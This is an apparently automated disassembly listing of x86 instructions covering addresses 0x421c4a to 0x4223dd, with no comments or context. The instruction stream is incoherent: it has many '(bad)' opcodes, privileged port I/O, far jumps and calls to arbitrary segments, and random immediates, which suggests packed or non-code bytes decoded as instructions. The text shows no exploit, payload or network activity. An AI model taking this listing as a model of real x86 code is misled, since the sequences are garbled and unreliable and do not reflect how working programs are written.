  421c4a:	scas   eax,DWORD PTR es:[edi]
  421c4b:	ret    0x2157
  421c4e:	xlat   BYTE PTR ds:[ebx]
  421c4f:	or     al,BYTE PTR [edi]
  421c51:	mov    ebp,0x447324c6
  421c56:	dec    esp
  421c57:	push   ebx
  421c58:	sub    ebp,DWORD PTR [esp+eax*1-0x2e871410]
  421c5f:	out    0xfc,al
  421c61:	call   0x21d4f8a2
  421c66:	mov    ah,0x3f
  421c68:	xchg   esp,eax
  421c69:	inc    edi
  421c6a:	cmp    BYTE PTR [ecx],0x4b
  421c6d:	stos   DWORD PTR es:[edi],eax
  421c6e:	ret    
  421c6f:	aam    0x3f
  421c71:	xchg   ecx,eax
  421c72:	cmp    edi,edi
  421c74:	and    eax,0xb196f2e2
  421c79:	scas   eax,DWORD PTR es:[edi]
  421c7a:	cmp    dh,dh
  421c7c:	jo     0x421c60
  421c7e:	out    dx,eax
  421c7f:	adc    al,0x7c
  421c81:	not    ecx
  421c83:	add    al,0xf
  421c85:	xchg   esp,eax
  421c86:	jg     0x421c7e
  421c88:	push   ebp
  421c89:	inc    di
  421c8b:	sar    BYTE PTR [eax+0x5e],0x76
  421c8f:	repnz or al,0xac
  421c92:	add    DWORD PTR [ebp-0xc99bc28],esi
  421c98:	cli    
  421c99:	mov    cl,BYTE PTR [edx+0x2c033496]
  421c9f:	and    eax,0x26ea1df8
  421ca4:	inc    esi
  421ca5:	(bad)  
  421ca6:	loope  0x421d15
  421ca8:	mov    edx,0xf1d64cac
  421cad:	push   0xda4c3899
  421cb2:	mov    edi,ss
  421cb4:	xor    ebp,esp
  421cb6:	jo     0x421cc4
  421cb8:	xor    eax,0xc3b994ad
  421cbd:	xchg   ecx,eax
  421cbe:	lds    ecx,FWORD PTR [ebx+0x4b]
  421cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cc2:	xlat   BYTE PTR ds:[ebx]
  421cc3:	xchg   ebp,eax
  421cc4:	or     al,0xe8
  421cc6:	icebp  
  421cc7:	cmp    BYTE PTR [ebx+0x1d],0xc4
  421ccb:	pushf  
  421ccc:	clc    
  421ccd:	rol    DWORD PTR [ebp-0xa],1
  421cd0:	lds    ebp,FWORD PTR [ebp-0x21]
  421cd3:	out    0xd3,al
  421cd5:	cmp    al,0x22
  421cd7:	mov    DWORD PTR [esi-0x4d],edi
  421cda:	imul   eax,DWORD PTR ds:0xf04f579a,0x17
  421ce1:	movntq (bad),mm1
  421ce2:	out    0xc8,eax
  421ce4:	dec    eax
  421ce5:	mov    dh,0xfd
  421ce7:	cmp    BYTE PTR [esi-0x745beea],cl
  421ced:	push   cs
  421cee:	xor    BYTE PTR [ebp-0x31],0x63
  421cf2:	(bad)  
  421cf3:	jle    0x421ccf
  421cf5:	or     BYTE PTR gs:[eax+0xd],dh
  421cf9:	xor    BYTE PTR [edx-0x6b],al
  421cfc:	sub    edi,edx
  421cfe:	pusha  
  421cff:	push   cs
  421d00:	mov    al,ds:0xc46fbcf0
  421d05:	cmp    DWORD PTR [ecx],0xffffffb3
  421d08:	out    dx,eax
  421d09:	sbb    DWORD PTR [ebp+0x2ccc4134],eax
  421d0f:	idiv   DWORD PTR [eax-0x5b]
  421d12:	fld    TBYTE PTR [ecx+0x36]
  421d15:	and    BYTE PTR [edx],al
  421d17:	sub    DWORD PTR [eax+0x73],edx
  421d1a:	mov    cl,dh
  421d1c:	mov    ecx,0x23be111d
  421d21:	into   
  421d22:	mov    esp,0xa90d8aac
  421d27:	int    0x70
  421d29:	out    0x70,eax
  421d2b:	xchg   esi,eax
  421d2c:	ss push edx
  421d2e:	test   al,0x4e
  421d30:	cli    
  421d31:	rol    DWORD PTR [ebx+esi*1-0x7d],cl
  421d35:	aad    0xb4
  421d37:	mov    esp,0x60c417c3
  421d3c:	mov    DWORD PTR [esi-0x5b],edi
  421d3f:	sbb    ebx,DWORD PTR [esi]
  421d41:	jmp    DWORD PTR [ecx]
  421d43:	push   es
  421d44:	jecxz  0x421d70
  421d46:	sub    DWORD PTR [edx],0x25a2e95d
  421d4c:	push   0x7f
  421d4e:	arpl   WORD PTR [ebx-0x17],sp
  421d51:	xchg   ebp,eax
  421d52:	hlt    
  421d53:	jbe    0x421cee
  421d55:	push   es
  421d56:	jmp    0xc3de:0x71431e23
  421d5d:	(bad)  
  421d5e:	cmp    ecx,DWORD PTR [ecx-0x6c2287b2]
  421d64:	repnz repnz xchg edi,eax
  421d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d68:	dec    esi
  421d69:	adc    ebp,eax
  421d6b:	jnp    0x421d67
  421d6d:	scas   eax,DWORD PTR es:[edi]
  421d6e:	dec    esi
  421d6f:	int    0xda
  421d71:	mov    BYTE PTR [ecx+0x228822c4],ch
  421d77:	inc    edi
  421d78:	mov    ebp,0xe0105a22
  421d7d:	or     dl,BYTE PTR [esi-0x42330c3d]
  421d83:	jns    0x421d48
  421d85:	mov    esp,0x8a0450b7
  421d8a:	stc    
  421d8b:	jle    0x421d26
  421d8d:	adc    BYTE PTR ds:0xdd9f8005,cl
  421d93:	jecxz  0x421d49
  421d95:	pop    es
  421d96:	jl     0x421dcf
  421d98:	jle    0x421dec
  421d9a:	cs dec eax
  421d9c:	cmp    ch,ch
  421d9e:	(bad)  
  421da0:	dec    eax
  421da1:	sub    al,0x9e
  421da3:	push   0xb63cf54e
  421da8:	xchg   ebp,eax
  421da9:	hlt    
  421daa:	and    BYTE PTR [ecx+0x4c9c00dc],0x2f
  421db1:	lock clc 
  421db3:	repnz and BYTE PTR [esi-0x4e573c60],dh
  421dba:	stos   DWORD PTR es:[edi],eax
  421dbb:	repnz fiadd WORD PTR [ebp-0x7b]
  421dbf:	lock lods eax,DWORD PTR ds:[esi]
  421dc1:	and    BYTE PTR [eax+esi*2+0xb6a0467],0x22
  421dc9:	lods   eax,DWORD PTR ds:[esi]
  421dca:	inc    ebp
  421dcb:	adc    esi,DWORD PTR [eax+ebx*2]
  421dce:	rcr    edx,0x51
  421dd1:	and    DWORD PTR [esi-0x45],edx
  421dd4:	test   esi,edx
  421dd6:	adc    edi,ecx
  421dd8:	jmp    0x27cb161f
  421ddd:	add    BYTE PTR [ebp-0x1ce259a5],ah
  421de3:	sub    dh,BYTE PTR [edi-0x2fc1e4a1]
  421de9:	adc    DWORD PTR [edx],ebp
  421deb:	ret    0x5895
  421dee:	jae    0x421e18
  421df0:	push   cs
  421df1:	pop    ss
  421df2:	aaa    
  421df3:	dec    edx
  421df4:	cmp    al,0x5b
  421df6:	hlt    
  421df7:	clc    
  421df8:	(bad)  
  421df9:	cmp    ebx,DWORD PTR [ebx-0x50]
  421dfc:	out    dx,eax
  421dfd:	jmp    0xbd1daef8
  421e02:	loopne 0x421d87
  421e04:	ja     0x421e4b
  421e06:	mov    bh,0xe9
  421e08:	jb     0x421db2
  421e0a:	loop   0x421e46
  421e0c:	dec    edx
  421e0d:	arpl   WORD PTR ds:0x9d5a5997,si
  421e13:	pop    edx
  421e14:	dec    ecx
  421e15:	push   ebx
  421e16:	out    dx,eax
  421e17:	retf   0xb150
  421e1a:	retf   
  421e1b:	cwde   
  421e1c:	aaa    
  421e1d:	mov    al,0x4
  421e1f:	push   eax
  421e20:	aad    0xd1
  421e22:	rol    BYTE PTR [ecx-0x1d],1
  421e25:	int3   
  421e26:	pushf  
  421e27:	aam    0xd8
  421e29:	adc    al,0x1b
  421e2b:	not    DWORD PTR [ecx]
  421e2d:	lods   eax,DWORD PTR ds:[esi]
  421e2e:	nop
  421e2f:	ins    DWORD PTR es:[edi],dx
  421e30:	(bad)
  421e34:	jecxz  0x421dcc
  421e36:	fnsave [ebp+0x41]
  421e39:	iret   
  421e3a:	push   esp
  421e3b:	and    ah,BYTE PTR [ecx+0x16]
  421e3e:	call   0xd95a:0x1a57f2d
  421e45:	push   ebp
  421e46:	rcl    edx,cl
  421e48:	cs xchg esp,eax
  421e4a:	aad    0xfb
  421e4c:	std    
  421e4d:	sti    
  421e4e:	jne    0x421e3b
  421e50:	aam    0xb8
  421e52:	sbb    al,0xa5
  421e54:	jns    0x421e1e
  421e56:	in     al,dx
  421e57:	push   cs
  421e58:	dec    ecx
  421e59:	stos   BYTE PTR es:[edi],al
  421e5a:	add    bl,BYTE PTR [esi]
  421e5c:	jle    0x421e88
  421e5e:	loope  0x421ed3
  421e60:	jb     0x421ec3
  421e62:	mov    ds:0x8ffa6076,eax
  421e67:	adc    cl,BYTE PTR [ecx-0x361ed7f]
  421e6d:	dec    ebp
  421e6e:	test   al,0x4c
  421e70:	inc    ecx
  421e71:	add    DWORD PTR [eax],edx
  421e73:	das    
  421e74:	lods   eax,DWORD PTR ds:[esi]
  421e75:	jno    0x421e0c
  421e77:	add    ebp,ecx
  421e79:	int    0x5c
  421e7b:	pop    ss
  421e7c:	nop    esp
  421e7f:	adc    esp,DWORD PTR [edx]
  421e81:	mov    al,ds:0x38c125b9
  421e86:	sbb    BYTE PTR [edx+0x39],0xae
  421e8a:	sti    
  421e8b:	push   eax
  421e8c:	lds    ecx,FWORD PTR [ebp-0x4407bd30]
  421e92:	out    dx,eax
  421e93:	dec    edx
  421e94:	cmp    BYTE PTR [ebx-0x4073229],bl
  421e9a:	(bad)  
  421e9b:	inc    BYTE PTR [esi-0x16]
  421e9e:	push   0xe
  421ea0:	xchg   ecx,eax
  421ea1:	jae    0x421e79
  421ea3:	idiv   BYTE PTR [ecx]
  421ea5:	push   ebx
  421ea6:	xor    BYTE PTR [eax],al
  421ea8:	(bad)  
  421ea9:	rol    BYTE PTR [esi-0x7],cl
  421eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ead:	sahf   
  421eae:	mov    esp,0x645fd9dd
  421eb4:	pop    es
  421eb5:	scas   eax,DWORD PTR es:[edi]
  421eb6:	mov    dh,BYTE PTR [esp+ebx*8-0x6a9b4fe3]
  421ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ebe:	mov    cl,0x3a
  421ec0:	adc    al,0x2
  421ec2:	and    BYTE PTR [edx+0xc26b3a],ah
  421ec8:	cmp    al,0x59
  421eca:	sub    dl,BYTE PTR [esi+0x6ccf6bd5]
  421ed0:	inc    edi
  421ed1:	and    DWORD PTR [edx-0x7e],eax
  421ed4:	gs (bad) 
  421ed7:	popa   
  421ed8:	cmp    eax,0x4e789763
  421edd:	mov    ds,WORD PTR [eax-0x12]
  421ee0:	imul   eax,DWORD PTR [ebp+ecx*4-0x51],0xbcc2f12a
  421ee8:	loop   0x421ebc
  421eea:	fxch   st(5)
  421eec:	mov    ah,BYTE PTR [ebx+0x2ac54e4]
  421ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ef3:	mov    bl,0xdf
  421ef5:	fld    QWORD PTR [edx+eiz*1+0x1c]
  421ef9:	dec    edx
  421efa:	mov    eax,ds:0x52f8ef19
  421eff:	mov    ecx,0xe230439b
  421f04:	in     al,0xd6
  421f06:	int    0x39
  421f08:	push   edx
  421f09:	sbb    edi,DWORD PTR [ecx+eiz*2-0x4da1138]
  421f10:	or     BYTE PTR ds:0x7970e668,cl
  421f16:	lea    ebp,[edx+0x2]
  421f19:	ss aas 
  421f1b:	ret    
  421f1c:	mov    al,ds:0xe20926b6
  421f21:	mul    DWORD PTR [edi]
  421f23:	sahf   
  421f24:	cli    
  421f25:	jecxz  0x421ebc
  421f27:	scas   eax,DWORD PTR es:[edi]
  421f28:	js     0x421eb9
  421f2a:	lods   al,BYTE PTR ds:[esi]
  421f2b:	dec    eax
  421f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f2d:	xchg   ecx,eax
  421f2e:	mov    eax,0x73ab5cf9
  421f33:	dec    ecx
  421f34:	outs   dx,BYTE PTR ds:[esi]
  421f35:	xlat   BYTE PTR ds:[ebx]
  421f36:	rcr    bh,1
  421f38:	jne    0x421f55
  421f3a:	xchg   esi,esi
  421f3c:	xchg   edx,eax
  421f3d:	and    BYTE PTR [edi],ch
  421f3f:	clc    
  421f40:	jl     0x4481e680
  421f46:	mov    dh,0xb9
  421f48:	in     al,0xc6
  421f4a:	push   ds
  421f4b:	aaa    
  421f4c:	or     DWORD PTR [eax+0x504204c5],ebp
  421f52:	jge    0x421fc0
  421f54:	jmp    DWORD PTR [ebx-0x6cd8fb75]
  421f5a:	jecxz  0x421fc5
  421f5c:	add    al,cl
  421f5e:	fild   WORD PTR [eax+0x6bc0624a]
  421f64:	mov    ds:0x57d9b3ac,eax
  421f69:	xchg   ebx,eax
  421f6a:	mov    dl,0xa3
  421f6c:	push   edx
  421f6d:	sbb    al,0x10
  421f6f:	dec    edi
  421f70:	daa    
  421f71:	mov    ecx,0x6059f8b0
  421f76:	sti    
  421f77:	popa   
  421f78:	repnz adc BYTE PTR ds:0x5f04,dl
  421f7e:	retf   
  421f7f:	outs   dx,DWORD PTR ds:[esi]
  421f80:	inc    ebp
  421f81:	and    eax,0x5936caae
  421f86:	sub    BYTE PTR ds:0x96a193c2,cl
  421f8c:	je     0x421f95
  421f8e:	call   0x79adfe9f
  421f93:	in     al,0x32
  421f95:	bound  esp,QWORD PTR [ebx]
  421f97:	pop    edx
  421f98:	jbe    0x421fd8
  421f9a:	pop    edx
  421f9b:	push   ds
  421f9c:	push   ss
  421f9d:	dec    edi
  421f9e:	jae    0x421feb
  421fa0:	das    
  421fa1:	lods   eax,DWORD PTR ds:[esi]
  421fa2:	cli    
  421fa3:	(bad)  
  421fa4:	pop    ecx
  421fa5:	mov    BYTE PTR [esi-0xaa7143c],bh
  421fab:	icebp  
  421fac:	ins    BYTE PTR es:[edi],dx
  421fad:	rcl    BYTE PTR [ebx+0x26bc79b3],0x4
  421fb4:	imul   edx,DWORD PTR [eax-0x5e],0x6a3e0860
  421fbb:	scas   al,BYTE PTR es:[edi]
  421fbc:	sub    ebp,DWORD PTR [edi]
  421fbe:	mov    edx,0x33bb4aba
  421fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fc4:	inc    eax
  421fc5:	std    
  421fc6:	out    dx,al
  421fc7:	xor    al,0xb1
  421fc9:	mov    bh,0x49
  421fcb:	mov    WORD PTR [edi-0x665b4d42],es
  421fd1:	(bad)  
  421fd2:	test   BYTE PTR [edx],0xd5
  421fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fd6:	sbb    eax,DWORD PTR [ecx+0x2a3f45e2]
  421fdc:	add    eax,0xe5f5dbb8
  421fe1:	and    al,0xb4
  421fe4:	aad    0xdf
  421fe6:	xor    eax,0x66051a63
  421feb:	sub    BYTE PTR [eax],0xc
  421fee:	inc    ecx
  421fef:	jg     0x421fd5
  421ff1:	mov    bh,0xd7
  421ff3:	mov    bh,0x82
  421ff5:	pop    edx
  421ff6:	bound  edx,QWORD PTR [edx+0xb39afe6]
  421ffc:	jno    0x421f9a
  421ffe:	adc    al,al
  422000:	loope  0x421fc9
  422002:	mov    ah,0xab
  422004:	xchg   edx,eax
  422005:	cmp    BYTE PTR [eax+0x24],al
  422008:	shr    DWORD PTR [edi-0x5b],0x5a
  42200c:	inc    esi
  42200d:	sbb    BYTE PTR [ebx-0x3d],dh
  422010:	iret   
  422011:	xchg   ecx,eax
  422012:	push   cs
  422013:	xor    al,0x54
  422015:	mov    eax,ds:0x83e08d6f
  42201a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42201c:	lock push edx
  42201e:	aaa    
  42201f:	dec    edi
  422020:	push   0x30
  422022:	test   edx,ebp
  422024:	dec    edx
  422025:	mov    BYTE PTR [eax],ah
  422027:	jge    0x422050
  422029:	inc    esi
  42202a:	cli    
  42202b:	shr    DWORD PTR [edx-0x38],0x96
  42202f:	sar    BYTE PTR [eax+ecx*2],cl
  422032:	les    esi,FWORD PTR [edi]
  422034:	fisubr DWORD PTR es:[ecx-0x4bdc34e4]
  42203b:	add    esp,DWORD PTR [ecx-0x3f]
  42203e:	and    al,0x8
  422040:	dec    edi
  422041:	mov    dl,0x2
  422043:	rol    DWORD PTR ds:[ecx+edi*1+0xea2f3c4],0x56
  42204c:	out    0x99,al
  42204e:	lahf   
  42204f:	inc    edx
  422050:	hlt    
  422051:	jne    0x42201e
  422053:	or     bh,BYTE PTR [ebp-0x3b]
  422056:	nop
  422057:	push   esp
  422058:	mov    ebx,DWORD PTR [esi+0x0]
  42205b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205c:	jmp    0x89480931
  422061:	lds    esp,FWORD PTR [eax]
  422063:	pop    ds
  422064:	test   BYTE PTR [ebp+0x2e],0xd6
  422068:	test   eax,0x98dc1ffe
  42206d:	push   esp
  42206e:	mov    bl,0x56
  422070:	aas    
  422071:	or     eax,0xd1ce12e5
  422076:	dec    ebp
  422077:	cmp    al,0x8b
  422079:	mov    WORD PTR [esi-0x1e],cs
  42207c:	mov    edi,0x78e04315
  422081:	(bad)  
  422082:	loopne 0x422022
  422084:	jl     0x422043
  422086:	xor    al,0x7
  422088:	sbb    eax,0x28f511da
  42208d:	out    0x83,eax
  42208f:	outs   dx,BYTE PTR ds:[esi]
  422090:	gs fsub st(7),st
  422093:	or     al,0xa7
  422095:	or     eax,0x1ea59c3c
  42209a:	retf   
  42209b:	inc    esi
  42209c:	mov    esi,0xabe8f585
  4220a1:	outs   dx,DWORD PTR ds:[esi]
  4220a2:	inc    ebx
  4220a3:	pop    edi
  4220a4:	loope  0x4220ca
  4220a6:	mov    al,0xea
  4220a8:	jno    0x422051
  4220aa:	mov    esp,0xc6bf3ed2
  4220af:	rol    BYTE PTR [eax+0x54],0x8a
  4220b3:	dec    eax
  4220b4:	stc    
  4220b5:	dec    edx
  4220b6:	dec    ebx
  4220b7:	inc    edi
  4220b8:	dec    edx
  4220b9:	scas   eax,DWORD PTR es:[edi]
  4220ba:	test   DWORD PTR [ecx],edx
  4220bc:	popa   
  4220bd:	jle    0x42206d
  4220bf:	aaa    
  4220c0:	inc    esp
  4220c1:	dec    ebp
  4220c2:	cmc    
  4220c3:	hlt    
  4220c4:	dec    ebx
  4220c5:	in     al,0xb
  4220c7:	xor    eax,0xa66b3f08
  4220cc:	jmp    0xd3f832b
  4220d1:	push   0x3e
  4220d3:	es add dl,bh
  4220d6:	pop    ds
  4220d7:	ds add al,0x19
  4220da:	sub    al,0x84
  4220dc:	cli    
  4220dd:	jno    0x4220b8
  4220df:	xchg   edx,eax
  4220e0:	or     DWORD PTR [ecx+0x4b],edi
  4220e3:	sbb    DWORD PTR [ebx-0x20],0xce1902c5
  4220ea:	ret    
  4220eb:	and    DWORD PTR [ebx-0x24],edx
  4220ee:	lods   eax,DWORD PTR ds:[esi]
  4220ef:	jecxz  0x4220ae
  4220f1:	ss mov eax,0xeb2e0cbd
  4220f7:	mov    edx,0x8630bb2
  4220fc:	je     0x42212f
  4220fe:	in     eax,0x16
  422100:	cmp    ch,0x7b
  422103:	cwde   
  422104:	jb     0x4220ac
  422106:	int3   
  422107:	push   esi
  422108:	std    
  422109:	push   cs
  42210a:	dec    edi
  42210b:	dec    edx
  42210c:	pop    eax
  42210d:	sbb    bl,BYTE PTR [edx+0x52]
  422110:	sti    
  422111:	pop    ecx
  422112:	xchg   esi,eax
  422113:	sbb    eax,0x597bd40d
  422118:	aaa    
  422119:	mov    cl,0x39
  42211b:	sub    al,0x3c
  42211d:	pop    ebp
  42211e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42211f:	js     0x4220d5
  422121:	popf   
  422122:	inc    ebp
  422123:	(bad)  
  422124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422125:	or     BYTE PTR [ebx],ch
  422127:	in     eax,0xb5
  422129:	xor    bl,BYTE PTR [eax]
  42212b:	lea    ecx,[edx-0x50d9f3f8]
  422131:	aam    0xf5
  422133:	test   DWORD PTR [eax+0xe00900e],0xd7beb867
  42213d:	cwde   
  42213e:	xor    al,0xaf
  422140:	(bad)  
  422141:	mov    eax,0x5c83af4e
  422146:	pushf  
  422147:	jmp    0x89b7:0xe643bd9d
  42214e:	xchg   BYTE PTR [ebp+0x6],ch
  422151:	nop
  422152:	xor    DWORD PTR [eax+0x5c8635a2],edi
  422158:	in     al,0x60
  42215a:	call   0xd986fd4a
  42215f:	pusha  
  422160:	addr16 jns 0x422190
  422163:	xor    ebp,DWORD PTR [esi]
  422165:	mul    DWORD PTR [edi-0x62]
  422168:	mov    ch,0x4e
  42216a:	ret    
  42216b:	mov    dl,bh
  42216d:	dec    edx
  42216e:	dec    eax
  42216f:	and    DWORD PTR [ecx+edx*4+0x4d20cb64],0x57
  422177:	(bad)  
  422178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422179:	ins    DWORD PTR es:[edi],dx
  42217a:	mov    edx,0xc10a022b
  42217f:	imul   edi,DWORD PTR [ecx-0x172f098],0xbb8badbd
  422189:	xchg   esi,eax
  42218a:	mov    DWORD PTR [ecx+0x5f],edx
  42218d:	sub    DWORD PTR [ebx+0x36],eax
  422190:	sahf   
  422191:	mov    edx,0x285da93
  422196:	push   0x5b910c08
  42219b:	push   gs
  42219d:	or     ecx,esp
  42219f:	xor    dl,BYTE PTR [esi]
  4221a1:	test   bl,al
  4221a3:	mov    ebx,0xfa954915
  4221a8:	test   eax,0x1a83e8c9
  4221ad:	inc    ebp
  4221ae:	xchg   esi,eax
  4221af:	sub    eax,0x7afbfadf
  4221b4:	add    ecx,DWORD PTR [esi-0x1f]
  4221b7:	aad    0x3f
  4221b9:	hlt    
  4221ba:	and    eax,0x31fd238b
  4221bf:	enter  0x9dad,0x23
  4221c3:	std    
  4221c4:	shl    BYTE PTR [ecx-0x4f],1
  4221c7:	mov    es,WORD PTR [eax-0x5f]
  4221ca:	gs sbb eax,0x18b5a638
  4221d0:	and    bh,BYTE PTR [edi+0x2d]
  4221d3:	dec    eax
  4221d4:	inc    esi
  4221d5:	sbb    DWORD PTR [edx-0x52],ebx
  4221d8:	sub    esp,ecx
  4221da:	es fucomip st,st(0)
  4221dd:	pop    ebp
  4221de:	(bad)  
  4221e0:	ficom  WORD PTR [edi]
  4221e2:	es or  bl,bh
  4221e5:	adc    DWORD PTR [edi+edx*4],eax
  4221e8:	xchg   DWORD PTR ds:0xb5207713,ebp
  4221ee:	popa   
  4221ef:	popf   
  4221f0:	or     dh,BYTE PTR [edx]
  4221f2:	pop    ebp
  4221f3:	mov    dl,0x57
  4221f5:	mov    ds:0x48cfb4af,al
  4221fa:	stos   BYTE PTR es:[edi],al
  4221fb:	fwait
  4221fc:	xchg   ecx,eax
  4221fd:	retf   
  4221fe:	js     0x4221bf
  422200:	cmp    al,0xfa
  422202:	hlt    
  422203:	imul   edi,DWORD PTR [ecx+0x3e],0x50562b49
  42220a:	add    DWORD PTR fs:[ecx],esi
  42220d:	das    
  42220e:	mov    eax,esp
  422210:	mov    bl,0xdf
  422212:	(bad)  
  422213:	lea    edi,[edi-0x38553691]
  422219:	clc    
  42221a:	je     0x4221b6
  42221c:	fs push edi
  42221e:	stos   DWORD PTR es:[edi],eax
  42221f:	mov    al,0x61
  422221:	aaa    
  422222:	push   ds
  422223:	fmul   st,st(6)
  422225:	cld    
  422226:	xor    ebp,DWORD PTR [edi+0x4b]
  422229:	iret   
  42222a:	jg     0x42220b
  42222c:	leave  
  42222d:	jno    0x42222b
  42222f:	clc    
  422230:	into   
  422231:	stos   BYTE PTR es:[edi],al
  422232:	inc    esp
  422233:	aam    0x1d
  422235:	mov    bl,0x10
  422237:	push   esi
  422238:	lods   al,BYTE PTR ds:[esi]
  422239:	scas   al,BYTE PTR es:[edi]
  42223a:	jp     0x422238
  42223c:	sti    
  42223d:	out    0x41,al
  42223f:	dec    esp
  422240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422241:	mov    dh,0xf8
  422243:	xor    BYTE PTR [edi+0x10],ah
  422246:	in     eax,0xb9
  422248:	sbb    DWORD PTR [edi],edx
  42224a:	and    eax,DWORD PTR [edx]
  42224c:	sbb    ecx,DWORD PTR [eax+0x26ac8c6f]
  422252:	inc    ebp
  422253:	and    BYTE PTR [ebx+edx*8+0x5b],dh
  422257:	aam    0xb2
  422259:	mov    ch,0x29
  42225b:	fcom   QWORD PTR [esi]
  42225d:	arpl   WORD PTR [ebx-0x518979b],ax
  422263:	adc    eax,0xe87796ab
  422268:	xchg   esi,eax
  422269:	call   0xce83:0x8db5f1e6
  422270:	leave  
  422271:	xchg   esi,eax
  422272:	test   eax,0x64e7031d
  422277:	pop    ebx
  422278:	mov    BYTE PTR [edx+0x10],ch
  42227b:	cmc    
  42227c:	les    eax,FWORD PTR [eax-0xf3504f7]
  422282:	mov    ah,0xc5
  422284:	cmp    al,BYTE PTR [ecx]
  422286:	fwait
  422287:	test   al,0xba
  422289:	lahf   
  42228a:	(bad)  
  42228b:	shl    BYTE PTR [edi-0x628ceedc],1
  422291:	xchg   esi,eax
  422292:	stos   DWORD PTR es:[edi],eax
  422293:	mov    cs,WORD PTR [ebx]
  422295:	sub    DWORD PTR [eax+0x36],esi
  422298:	xsaveopt ds:0xe4b3c2f5
  42229f:	push   ebx
  4222a0:	push   0x534ff2d4
  4222a5:	or     BYTE PTR ss:[esi+eax*4+0x4f],0x58
  4222ab:	pop    ebx
  4222ac:	cs leave 
  4222ae:	inc    ebx
  4222af:	jg     0x4222f8
  4222b1:	call   0xede5:0x3e96c33
  4222b8:	push   0x670bca84
  4222bd:	jp     0x4222c9
  4222bf:	test   eax,0x1fa8af2
  4222c4:	xchg   ebx,eax
  4222c5:	dec    esi
  4222c6:	mov    ah,0x61
  4222c8:	in     al,dx
  4222c9:	mov    edi,0x8ab00ff5
  4222ce:	retf   0x7967
  4222d1:	(bad)  
  4222d2:	leave  
  4222d3:	xchg   ebx,eax
  4222d4:	scas   eax,DWORD PTR es:[edi]
  4222d5:	out    dx,eax
  4222d6:	sbb    eax,DWORD PTR [ebp+0x45112363]
  4222dc:	push   ss
  4222dd:	inc    ebx
  4222de:	aad    0xc7
  4222e0:	cmp    esp,edx
  4222e2:	mov    ds:0x11b63efc,al
  4222e7:	push   esp
  4222e8:	xchg   ecx,eax
  4222e9:	jmp    0x6c5b:0x3877268e
  4222f0:	outs   dx,BYTE PTR ds:[esi]
  4222f1:	and    BYTE PTR [eax+0x6a],ah
  4222f4:	fwait
  4222f5:	in     eax,dx
  4222f6:	sub    DWORD PTR [ebx+0x672e25d5],ebp
  4222fc:	inc    ebp
  4222fd:	outs   dx,BYTE PTR ds:[esi]
  4222fe:	lahf   
  4222ff:	add    bl,BYTE PTR [ebp-0x1]
  422302:	js     0x4222fc
  422304:	gs pop ebx
  422306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422307:	ret    0xa833
  42230a:	aad    0xd5
  42230c:	cdq    
  42230d:	repnz (bad) 
  42230f:	jge    0x422390
  422311:	out    0xcc,eax
  422313:	cs pushf 
  422315:	fisubr DWORD PTR [ebp+eiz*2-0x29]
  422319:	mov    bl,0x55
  42231b:	jecxz  0x4222f0
  42231d:	jl     0x422387
  42231f:	and    eax,0xe3d08aac
  422324:	add    edx,esi
  422326:	and    eax,DWORD PTR [eax]
  422328:	aas    
  422329:	push   esi
  42232a:	sub    DWORD PTR [ebx],0xffffff96
  42232d:	inc    ebx
  42232e:	test   al,0x96
  422330:	inc    esp
  422331:	inc    ebp
  422332:	test   al,0x8a
  422334:	mov    ds:0x29dfdde5,eax
  422339:	jbe    0x4222f5
  42233b:	jb     0x4222fb
  42233d:	repnz inc eax
  42233f:	(bad)  
  422340:	and    eax,ebx
  422342:	int3   
  422343:	jmp    0x53742fe5
  422348:	(bad)  
  422349:	mov    al,0x77
  42234b:	das    
  42234c:	mov    al,0x5c
  42234e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42234f:	aad    0xdb
  422351:	xor    BYTE PTR [ecx+ebp*1-0x21],bl
  422355:	daa    
  422356:	xchg   ebx,eax
  422357:	dec    ebp
  422358:	or     eax,0x6f11e595
  42235d:	sbb    al,0x5c
  42235f:	mov    bh,0x7f
  422361:	or     ecx,DWORD PTR [ebp+0x612d94ee]
  422367:	addr16 pop ebx
  422369:	push   esi
  42236a:	(bad)
  42236d:	push   esi
  42236e:	sub    BYTE PTR [ebp-0x34],0x6a
  422372:	xchg   ch,dl
  422374:	mov    bh,0x33
  422376:	jno    0x422355
  422378:	in     al,0x69
  42237a:	add    bh,BYTE PTR [ecx-0x2fd0ba89]
  422380:	sbb    BYTE PTR [ebx-0x66],ah
  422383:	pop    edi
  422384:	push   ebp
  422385:	or     eax,0xe4c0d360
  42238a:	xor    dh,BYTE PTR [esi+0x68b2de36]
  422390:	mov    al,BYTE PTR [ecx-0x45e89545]
  422396:	pop    esi
  422397:	sub    eax,0xd38a3e86
  42239c:	and    esi,ebp
  42239e:	stos   BYTE PTR es:[edi],al
  42239f:	test   DWORD PTR [ebx-0x6ee4ffc7],ebx
  4223a5:	(bad)  
  4223a6:	daa    
  4223a7:	loopne 0x422345
  4223a9:	cmp    DWORD PTR ds:0x667562ea,edi
  4223af:	jnp    0x4223f1
  4223b1:	and    BYTE PTR [edx+0x48fb85e6],ch
  4223b7:	sub    eax,0x59138018
  4223bc:	mov    esi,0xf82f3f7f
  4223c1:	and    ebp,DWORD PTR [ebx+0x7464cd26]
  4223c7:	fstp   QWORD PTR [ebx-0x7e]
  4223ca:	mov    dl,0xcb
  4223cc:	das    
  4223cd:	cmp    BYTE PTR [ecx+esi*4],bl
  4223d0:	xchg   edx,eax
  4223d1:	mov    esi,0x53531744
  4223d6:	mov    ebp,0xd5c9d361
  4223db:	pop    es
  4223dc:	into   
  4223dd:	in     al,0x5
